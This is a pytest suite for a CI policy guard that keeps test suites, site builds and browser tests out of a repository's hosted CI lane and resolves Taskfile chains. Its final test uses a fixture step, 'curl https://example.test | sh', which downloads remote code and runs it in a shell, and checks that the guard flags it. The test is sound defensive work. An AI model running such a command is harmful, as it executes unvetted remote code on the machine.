"""Tests for the hosted-CI lean-lane policy guard."""

from __future__ import annotations

from pathlib import Path

from scripts.check_hosted_ci_policy import (
    expand_aggregate_commands,
    expand_task_invocations,
    extract_action_references,
    extract_run_commands,
    find_all_policy_violations,
    find_forbidden_reach,
    find_jobs_without_timeout,
    find_policy_violations,
    parse_taskfile,
    reachable_commands,
    resolve_task,
    unresolved_task_invocations,
)

WORKFLOW_PREAMBLE = """name: CI

on:
  pull_request:

jobs:
  checks:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
"""


def _workflow(steps: str) -> str:
    """Build a minimal, policy-shaped workflow with the given steps block."""

    return WORKFLOW_PREAMBLE + steps


def test_this_repository_currently_satisfies_the_policy() -> None:
    """The guard must pass against the workflows actually committed here."""

    violations, workflow_paths = find_all_policy_violations()

    assert violations == []
    assert workflow_paths, "no hosted workflows were scanned"


def test_deploy_workflow_is_exempt_from_the_scan() -> None:
    """Building the site is the deploy gate's job, so it is not held to lean CI."""

    _, workflow_paths = find_all_policy_violations()

    assert "deploy.yml" not in {path.name for path in workflow_paths}


def test_extract_run_commands_reads_inline_and_block_scalars() -> None:
    """Both `run: cmd` and a `run: |` block must be visible to the scanner."""

    source = _workflow(
        "      - run: uv sync --frozen\n"
        "      - name: Block\n"
        "        run: |\n"
        "          echo one\n"
        "          echo two\n"
    )

    assert extract_run_commands(source) == ["uv sync --frozen", "echo one\necho two"]


def test_extract_action_references_reads_pinned_uses() -> None:
    """Action references are checked against the pinned allowlist."""

    source = _workflow("      - uses: actions/checkout@abc123 # v7.0.0\n")

    assert extract_action_references(source) == ["actions/checkout@abc123"]


def test_a_direct_pytest_step_is_a_violation() -> None:
    """The plainest regression — a test suite pasted into the hosted lane."""

    findings = find_forbidden_reach("uv run python -m pytest")

    assert len(findings) == 1
    assert "unit/integration test suite" in findings[0]


def test_a_direct_site_build_step_is_a_violation() -> None:
    """`mkdocs build` belongs to the deploy gate, never the hosted lane."""

    findings = find_forbidden_reach("uv run mkdocs build --strict")

    assert len(findings) == 1
    assert "application or site build" in findings[0]


def test_a_browser_suite_step_is_a_violation() -> None:
    """Playwright never runs in the hosted lane."""

    assert find_forbidden_reach("uv run playwright install chromium")


def test_the_ci_plan_reaches_nothing_forbidden() -> None:
    """The command hosted CI actually runs must survive its own guard."""

    assert find_forbidden_reach("uv run python scripts/verify.py --plan ci") == []


def test_a_heavier_plan_is_caught_through_the_aggregate_runner() -> None:
    """A workflow cannot smuggle tests in behind an allowlisted-looking runner call."""

    findings = find_forbidden_reach("uv run python scripts/verify.py --plan prepush")
    reasons = " ".join(findings)

    assert findings
    assert "unit/integration test suite" in reasons
    assert "application or site build" in reasons
    assert "verify.py --plan prepush ->" in reasons


def test_an_unpinned_aggregate_runner_resolves_to_the_heaviest_tier() -> None:
    """Omitting --plan must not be read as 'lean'; it resolves to validate."""

    findings = find_forbidden_reach("uv run python scripts/verify.py")
    reasons = " ".join(findings)

    assert findings
    assert "browser/e2e/visual suite" in reasons


def test_expanding_the_ci_plan_yields_real_commands() -> None:
    """Aggregate expansion resolves to the underlying subprocess commands."""

    expanded = expand_aggregate_commands("uv run python scripts/verify.py --plan ci")

    assert expanded
    assert all(command.startswith("python ") for _, command in expanded)


def test_a_non_aggregate_command_expands_to_nothing() -> None:
    """Only the verification runner is treated as an aggregate."""

    assert expand_aggregate_commands("uv sync --frozen") == []


def test_a_job_without_a_timeout_is_a_violation() -> None:
    """A hung step must fail fast, not burn GitHub's six-hour default."""

    source = "jobs:\n  checks:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n"

    assert find_jobs_without_timeout(source) == ["checks"]


def test_a_job_with_a_timeout_is_accepted() -> None:
    """The guard recognises a declared job-level timeout."""

    assert find_jobs_without_timeout(WORKFLOW_PREAMBLE) == []


# --------------------------------------------------------------------------
# Taskfile resolution — the indirection layer the lean-CI rule regresses through
# --------------------------------------------------------------------------
TASKFILE = """version: "3"

tasks:
  policy:
    desc: Guard
    cmds:
      - uv run python scripts/check_hosted_ci_policy.py

  test:
    desc: Tests
    cmds:
      - uv run python -m pytest

  build:
    desc: Build
    cmds:
      - uv run mkdocs build --strict

  ci:
    desc: Lean gate
    cmds:
      - task: policy
      - uv run python scripts/verify.py --plan ci

  sneaky:
    cmds:
      - task: ci
      - task: test
"""


def test_parse_taskfile_reads_commands_and_subtask_edges() -> None:
    """Both edge kinds a task can carry must be visible to the resolver."""

    subtasks, commands = parse_taskfile(TASKFILE)

    assert subtasks["ci"] == ["policy"]
    assert commands["ci"] == ["uv run python scripts/verify.py --plan ci"]
    assert commands["test"] == ["uv run python -m pytest"]


def test_parse_taskfile_ignores_descriptions_and_non_task_blocks() -> None:
    """`desc:` text and top-level keys are not commands and must not be scanned."""

    _, commands = parse_taskfile(TASKFILE)

    assert all("Guard" not in command for command in commands["policy"])
    assert "version" not in commands


def test_resolve_task_walks_transitively_with_a_chain() -> None:
    """A command two hops down is reported with the path that reaches it."""

    subtasks, commands = parse_taskfile(TASKFILE)

    reached, unresolved = resolve_task("sneaky", subtasks, commands)

    assert unresolved == []
    assert (
        "task:sneaky -> task:ci -> task:policy",
        "uv run python scripts/check_hosted_ci_policy.py",
    ) in reached
    assert ("task:sneaky -> task:test", "uv run python -m pytest") in reached


def test_resolve_task_reports_an_undefined_task_rather_than_passing_it() -> None:
    """A task that cannot be inspected is never assumed innocent."""

    subtasks, commands = parse_taskfile(TASKFILE)

    _, unresolved = resolve_task("nope", subtasks, commands)

    assert unresolved == ["task:nope"]


def test_this_repository_task_ci_is_the_command_the_workflow_runs() -> None:
    """The committed Taskfile must define the `ci` task hosted CI invokes."""

    assert expand_task_invocations("task ci")
    assert unresolved_task_invocations("task ci") == []


def test_task_ci_reaches_nothing_forbidden_in_this_repository() -> None:
    """The real gate, resolved through the real Taskfile and the real plan."""

    assert find_forbidden_reach("task ci") == []


def test_task_ci_reaches_the_policy_guard_and_the_lean_plan() -> None:
    """The lean gate must actually run the guard; a gate that skips it is a no-op."""

    reached = {command for _, command in reachable_commands("task ci")}

    assert "uv run python scripts/check_hosted_ci_policy.py" in reached
    assert "uv run python scripts/verify.py --plan ci" in reached
    # And the walk crosses into the plan's own subprocess list.
    assert any("check_page_metadata.py" in command for command in reached)


def test_a_heavy_task_is_caught_through_the_task_graph() -> None:
    """`task prepush` runs a test suite and a build; the hosted lane must refuse it."""

    reasons = " ".join(find_forbidden_reach("task prepush"))

    assert "unit/integration test suite" in reasons
    assert "application or site build" in reasons


def test_an_undefined_task_invocation_is_a_violation() -> None:
    """A workflow cannot point at a task this repository does not define."""

    reasons = " ".join(find_forbidden_reach("task ci:does-not-exist"))

    assert "unresolvable task" in reasons


def test_find_policy_violations_reports_an_unallowlisted_command(tmp_path: Path) -> None:
    """Anything outside the exact allowlist is surfaced, not silently tolerated."""

    workflow = tmp_path / "ci.yml"
    workflow.write_text(_workflow("      - run: curl https://example.test | sh\n"), "utf-8")

    violations = find_policy_violations(workflow)

    assert any("curl https://example.test | sh" in violation for violation in violations)
